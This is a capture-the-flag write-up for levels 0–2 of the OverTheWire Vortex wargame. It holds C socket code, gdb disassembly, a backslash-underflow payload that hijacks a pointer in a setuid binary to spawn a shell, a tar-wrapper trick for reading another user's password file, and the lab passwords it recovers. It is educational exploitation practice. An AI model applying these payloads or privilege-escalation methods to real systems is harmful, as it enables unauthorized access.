# Vortex -> OverTheWire

## Vortex Wargame Overview

The Vortex wargame is an immersive challenge designed to enhance skills in 
system exploration, debugging, and exploitation, with a specific focus on 
x86 architectures. Comprising 27 distinct levels, the game is meticulously 
structured to facilitate progressive learning and mastery in these critical 
areas.

* Scope: 27 Levels of increasing complexity and challenge.
* Focus Areas: Emphasizes hands-on learning in x86 system 
  exploration, debugging techniques, and exploitation strategies.
* Resource Location: Essential files and resources for the wargame 
  are centrally located in the /vortex/ directory, ensuring easy 
  access and navigation.

Whether someone's looking to sharpen their skills or delve into the 
intricacies of x86 systems, the Vortex wargame offers a comprehensive 
platform for both educational and practical enhancement in the realm of 
"hacking".

## Connection 

### Level 0 vs Other levels

In general, connection to the overthewire servers can be established 
with `ssh`, by executing:

    ssh vortex#@vortex.labs.overthewire.org -p 2228

where # is the level number.

But, level zero does not have a given password in order to start the game.
In order to connect to level 1, our goal is: 

* connect to port 5842 on vortex.labs.overthewire.org
* read in 4 unsigned integers in host byte order 
* add these integers together 
* send back the results to get a username and password for vortex1 

This information can be used to log in using SSH.


### Starting point

We need to write some code here. Following explicitly the instructions
above, one can simply program in C the code bellow, in order to get the 
password for the first level.

    #include <netdb.h>
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <stdio.h>
    #include <unistd.h>
    #include <string.h>
    #include <stdlib.h>
    #include <arpa/inet.h>

    #define HOST "vortex.labs.overthewire.org"
    #define PORT "5842"
    #define SIZE 32

    int main(int argc, char **argv) {

        // Host look-up
        int getaddrinfo_status;
        struct addrinfo hints, *server_info;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family   = AF_INET;
        hints.ai_protocol = 0;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags    = AI_PASSIVE;

        printf("Retrieving server information for hostname: %s\n", HOST);
        sleep(1);
        if ((getaddrinfo_status = getaddrinfo(HOST, PORT, &hints, &server_info))) {
            fprintf(stderr, "[!] Something went wrong with server information retrieving (status: %d) \n",
            getaddrinfo_status);
            exit(EXIT_FAILURE);
        }

        // Socket creation and connection establishment
        int sockfd, conn_status;
        struct addrinfo *ptr;
        for (ptr = server_info; ptr != NULL; ptr = ptr->ai_next) {
            sleep(1);
            sockfd = socket(AF_INET, SOCK_STREAM, ptr->ai_protocol);
            if (sockfd < 0) {
                fprintf(stderr, "[!] Error in creating socket \n");
                continue;
            }
            printf("Socket created successfully \n");

            sleep(1);
            conn_status = connect(sockfd, ptr->ai_addr, ptr->ai_addrlen);
            if (conn_status < 0) {
                fprintf(stderr, "[!] Error connecting \n");
                continue;
            }
            printf("Connection established successfully \n");
            break;
        }

        char ip[SIZE];
        inet_ntop(ptr->ai_family, ptr->ai_addr, ip, sizeof(ip));
        printf("Connecting to %s:%s ~ Hostname: %s\n", ip, PORT, HOST);
        freeaddrinfo(server_info);

        // Interaction with the server
        // 
        // GOAL
        // 
        // * Connect to port 5842 on vortex.labs.overthewire.org [OK]
        // * Read in 4 unsigned integers in host byte order 
        // * Add these integers together
        // * Send back the results to get a username and password for vortex1
        //

        // receiving
        unsigned int sum = 0, received_num;
        for (int i = 0; i < 4; ++i) {
            recv(sockfd, &received_num, sizeof(unsigned int), 0);
            sum += received_num;
        }

        // sending back
        send(sockfd, &sum, sizeof(unsigned int), 0);

        // receiving password
        char password[SIZE*2] = {'\0'};
        recv(sockfd, password, SIZE*2, 0);
        printf("\n%s \n", password);

        close(sockfd);
        return;


* Compilation: gcc -Wall -g vortex0.c -o v0
* Execution:   ./v0
* Password:    Gq#qu3bF3

### Level 1

The code for this level is shown bellow: 

```c
    #define _GNU_SOURCE
    #include <stdlib.h>
    #include <unistd.h>
    #include <string.h>
    #include <stdio.h>

    #define e(); if(((unsigned int)ptr & 0xff000000)==0xca000000) { setresuid(geteuid(), geteuid(), geteuid()); execlp("/bin/sh", "sh", NULL); printf("%p %p\n", &ptr,ptr); }

    void print(unsigned char *buf, int len)
    {
        int i;

        printf("[ ");
        for(i=0; i < len; i++) printf("%x ", buf[i]); 
        printf(" ]\n");
    }

    int main()
    {
        // 512 + 4 + 4 = 520 + DWORD PTR [ecx-0x4] + ebp + esi + ebx + ecx = 540 
        unsigned char buf[512];
        unsigned char *ptr = buf + (sizeof(buf)/2);
        unsigned int x;


        while((x = getchar()) != EOF) {
            switch(x) {
                case '\n': {
                    print(buf, sizeof(buf)); 
                    continue; 
                    break;
                }
                case '\\': { 
                    ptr--; 
                    break;
                } 
                default: { 
                    e(); 
                    if(ptr > buf + sizeof(buf)) 
                        continue; 
                    ptr++[0] = x; // SOS: x is written before the inc. Meaning 1. ptr[0] = x 2. ptr++
                    break;
                }
            }
        }
        printf("All done\n");
        return 0;
    }
```

As everybody could easily understand here, the task is to execute the shell inside 
the `e()` macro. But in order to achieve it, this<br />

`if(((unsigned int)ptr & 0xff000000)==0xca000000)`<br />

condition has to be met, meaning we need to manipulate the pointer's value or the 
address that it points to.

The code above is quite simple:
We will only focus on debugging the binary and try to meet the condition inside 
`e()`. Before doing anything, first things that stands out in the code, when it 
comes to vulnerabilities, is the fact that when `getchar()` reads `\\` from the 
input, the `ptr` drops one byte back inside the buffer. In this case, a possibility 
for a *buffer underflow*, is arised, meaning the pointer could point back to 
arbitrary memory or memory that is wasn't supposed to pretty easily, just by entering 
the correct number of `\\` as input.

Let's fire up `gdb`, set disassembly-flavor intel, pagination off and dissasemble the 
main function.

```asm
    (gdb) set disassembly-flavor intel 
    (gdb) set pagination off 
    (gdb) disassemble main 
    Dump of assembler code for function main:
    0x08049233 <+0>:	lea    ecx,[esp+0x4]
    0x08049237 <+4>:	and    esp,0xfffffff0
    0x0804923a <+7>:	push   DWORD PTR [ecx-0x4]
    0x0804923d <+10>:	push   ebp
    0x0804923e <+11>:	mov    ebp,esp
    0x08049240 <+13>:	push   esi
    0x08049241 <+14>:	push   ebx
    0x08049242 <+15>:	push   ecx
    0x08049243 <+16>:	sub    esp,0x21c
    0x08049249 <+22>:	mov    eax,gs:0x14
    0x0804924f <+28>:	mov    DWORD PTR [ebp-0x1c],eax
    0x08049252 <+31>:	xor    eax,eax
    0x08049254 <+33>:	lea    eax,[ebp-0x21c]
    0x0804925a <+39>:	add    eax,0x100
    0x0804925f <+44>:	mov    DWORD PTR [ebp-0x224],eax
    0x08049265 <+50>:	jmp    0x8049345 <main+274>
    0x0804926a <+55>:	cmp    DWORD PTR [ebp-0x220],0xa
    0x08049271 <+62>:	je     0x804927e <main+75>
    0x08049273 <+64>:	cmp    DWORD PTR [ebp-0x220],0x5c
    0x0804927a <+71>:	je     0x804929a <main+103>
    0x0804927c <+73>:	jmp    0x80492ae <main+123>
    0x0804927e <+75>:	sub    esp,0x8
    0x08049281 <+78>:	push   0x200
    0x08049286 <+83>:	lea    eax,[ebp-0x21c]
    0x0804928c <+89>:	push   eax
    0x0804928d <+90>:	call   0x80491d6 <print>
    0x08049292 <+95>:	add    esp,0x10
    0x08049295 <+98>:	jmp    0x8049345 <main+274>
    0x0804929a <+103>:	mov    eax,DWORD PTR [ebp-0x224]
    0x080492a0 <+109>:	sub    eax,0x1
    0x080492a3 <+112>:	mov    DWORD PTR [ebp-0x224],eax
    0x080492a9 <+118>:	jmp    0x8049345 <main+274>
    0x080492ae <+123>:	mov    eax,DWORD PTR [ebp-0x224]
    0x080492b4 <+129>:	and    eax,0xff000000
    0x080492b9 <+134>:	cmp    eax,0xca000000
    0x080492be <+139>:	jne    0x8049316 <main+227>
    0x080492c0 <+141>:	call   0x80490a0 <geteuid@plt>
    0x080492c5 <+146>:	mov    esi,eax
    0x080492c7 <+148>:	call   0x80490a0 <geteuid@plt>
    0x080492cc <+153>:	mov    ebx,eax
    0x080492ce <+155>:	call   0x80490a0 <geteuid@plt>
    0x080492d3 <+160>:	sub    esp,0x4
    0x080492d6 <+163>:	push   esi
    0x080492d7 <+164>:	push   ebx
    0x080492d8 <+165>:	push   eax
    0x080492d9 <+166>:	call   0x8049040 <setresuid@plt>
    0x080492de <+171>:	add    esp,0x10
    0x080492e1 <+174>:	sub    esp,0x4
    0x080492e4 <+177>:	push   0x0
    0x080492e6 <+179>:	push   0x804a012
    0x080492eb <+184>:	push   0x804a015
    0x080492f0 <+189>:	call   0x8049090 <execlp@plt>
    0x080492f5 <+194>:	add    esp,0x10
    0x080492f8 <+197>:	mov    eax,DWORD PTR [ebp-0x224]
    0x080492fe <+203>:	sub    esp,0x4
    0x08049301 <+206>:	push   eax
    0x08049302 <+207>:	lea    eax,[ebp-0x224]
    0x08049308 <+213>:	push   eax
    0x08049309 <+214>:	push   0x804a01d
    0x0804930e <+219>:	call   0x8049060 <printf@plt>
    0x08049313 <+224>:	add    esp,0x10
    0x08049316 <+227>:	lea    eax,[ebp-0x21c]
    0x0804931c <+233>:	add    eax,0x200
    0x08049321 <+238>:	mov    edx,DWORD PTR [ebp-0x224]
    0x08049327 <+244>:	cmp    eax,edx
    0x08049329 <+246>:	jae    0x804932d <main+250>
    0x0804932b <+248>:	jmp    0x8049345 <main+274>
    0x0804932d <+250>:	mov    eax,DWORD PTR [ebp-0x224]
    0x08049333 <+256>:	lea    edx,[eax+0x1]
    0x08049336 <+259>:	mov    DWORD PTR [ebp-0x224],edx
    0x0804933c <+265>:	mov    edx,DWORD PTR [ebp-0x220]
    0x08049342 <+271>:	mov    BYTE PTR [eax],dl
    0x08049344 <+273>:	nop
    0x08049345 <+274>:	call   0x8049070 <getchar@plt>
    0x0804934a <+279>:	mov    DWORD PTR [ebp-0x220],eax
    0x08049350 <+285>:	cmp    DWORD PTR [ebp-0x220],0xffffffff
    0x08049357 <+292>:	jne    0x804926a <main+55>
    0x0804935d <+298>:	sub    esp,0xc
    0x08049360 <+301>:	push   0x804a024
    0x08049365 <+306>:	call   0x80490b0 <puts@plt>
    0x0804936a <+311>:	add    esp,0x10
    0x0804936d <+314>:	mov    eax,0x0
    0x08049372 <+319>:	mov    edx,DWORD PTR [ebp-0x1c]
    0x08049375 <+322>:	sub    edx,DWORD PTR gs:0x14
    0x0804937c <+329>:	je     0x8049383 <main+336>
    0x0804937e <+331>:	call   0x8049080 <__stack_chk_fail@plt>
    0x08049383 <+336>:	lea    esp,[ebp-0xc]
    0x08049386 <+339>:	pop    ecx
    0x08049387 <+340>:	pop    ebx
    0x08049388 <+341>:	pop    esi
    0x08049389 <+342>:	pop    ebp
    0x0804938a <+343>:	lea    esp,[ecx-0x4]
    0x0804938d <+346>:	ret    
    End of assembler dump.
```

After locating where the variables of our interest are placed inside the stack: 

* `ptr` @ [$ebp-548] ($ebp-0x224)
* `x`   @ [$ebp-544] ($ebp-0x220)
* `buf` @ [$ebp-540] ($ebp-0x21c)


```
      STACK LAYOUT

-------------------------
|      ptr  (4 bytes)   |
-------------------------
|       x (4 bytes)     |
-------------------------
|        buf            |
|        ...            |
|        ...            |
|        ...            |
|                       |
|   (512 bytes)         |
-------------------------
        ...
        ...

        ...
-------------------------
|     ebp  (4 bytes)    |
-------------------------
```

we can start breaking the code flow. 

* With 256 '\\' the pointer points at the start of the buffer, because
it's starting position is at the middle of the buffer.
* With 4 '\\' more the pointer points at x, which is the character that reads
from the input.
* With 1 more '\\' the pointer points to its own memory.

So, with 261 '\\' as input we can make the pointer point to itself.

Now, let's look at some more assembly code.

```asm
    # Here is the switch case
    0x08049265 <+50>:	jmp    0x8049345 <main+274>     -> getchar
    0x0804926a <+55>:	cmp    DWORD PTR [ebp-544],0xa  -> compares x with `\n`
    0x08049271 <+62>:	je     0x804927e <main+75>
    0x08049273 <+64>:	cmp    DWORD PTR [ebp-544],0x5c -> compares with `\\`
    0x0804927a <+71>:	je     0x804929a <main+103>
    0x0804927c <+73>:	jmp    0x80492ae <main+123>     -> default switch case

    ...
    ...
    # Here is where the decrement of the pointer is happening
    0x0804929a <+103>:	mov    eax,DWORD PTR [ebp-548]
    0x080492a0 <+109>:	sub    eax,0x1
    0x080492a3 <+112>:	mov    DWORD PTR [ebp-548],eax
    ...
    ...

    # Here is where the assignment of the value of x is done into ptr
    0x0804932d <+250>:	mov    eax,DWORD PTR [ebp-548]
    0x08049333 <+256>:	lea    edx,[eax+0x1]
    0x08049336 <+259>:	mov    DWORD PTR [ebp-548],edx
    0x0804933c <+265>:	mov    edx,DWORD PTR [ebp-544]
    0x08049342 <+271>:	mov    BYTE PTR [eax],dl -> dl lowest byte of edx written in old ptr position
    0x08049344 <+273>:	nop
```

As obvious, one can create the below mentioned command:

```
# /tmp/tsosmi/vortex1_exp.sh: run with . /tmp/tsosmi/vortex1_exp.sh > /tmp/tsosmi/vortex1_exp
echo -ne "\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5c\xca\x41"
```

and send its output to the binary this way in order to obtain a shell and grab
the password for the next level: 

```
vortex1@gibson:~$ cat /tmp/tsosmi/vortex1_exp - | /vortex/vortex1 
whoami
vortex2
cat /etc/vortex_pass/vortex2 
WyEmn5wiX
```

### Level 2

The code for this level is shown below: 

```
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>


int main(int argc, char **argv)
{
        char *args[] = { "/bin/tar", "cf", "/tmp/ownership.$$.tar", argv[1], argv[2], argv[3] };
        execv(args[0], args);
```

The command /bin/tar is executed with specific arguments. The c flag indicates 
archive creation, while f specifies the archive name. The arguments argv[1], 
argv[2], and argv[3] represent the files to be included in the TAR archive.
What's interesting here is that the archive name includes an absolute path.
Although, in case someone checks the manpage for tar command, he/she can find
this: 

```
-P, --absolute-names
    Don't strip leading slashes from file names when creating archives.
```

This flag when specified does not strip leading slashes when creating an archive, 
which indicates that full (abosulte) paths can specified as the name of the archive.
But in the target code there is no such flag. One can exploit this as shown below, in 
order to obtain the password for the next level. 

```
vortex2@gibson:/etc/vortex_pass$ /vortex/vortex2 vortex3 
vortex2@gibson:/etc/vortex_pass$ ls -l /tmp/ownership.$$.tar 
ls: cannot access '/tmp/ownership.4011669.tar': No such file or directory
vortex2@gibson:/etc/vortex_pass$ ls -l /tmp/ownership.\$$.tar 
-rw-rw-r-- 1 vortex3 vortex2 10240 Jun 15 18:07 /tmp/ownership.$$.tar
vortex2@gibson:/etc/vortex_pass$ 
vortex2@gibson:/etc/vortex_pass$ 
vortex2@gibson:/etc/vortex_pass$ 
vortex2@gibson:/etc/vortex_pass$ mkdir /tmp/lalala
vortex2@gibson:/etc/vortex_pass$ cd /tmp/lalala
vortex2@gibson:/tmp/lalala$ tar -xvf /tmp/ownership.\$$.tar 
vortex3
vortex2@gibson:/tmp/lalala$ cat vortex3 
YAVzRBMI4 
```

### Level 3 

## References

[0] https://overthewire.org/wargames/vortex/

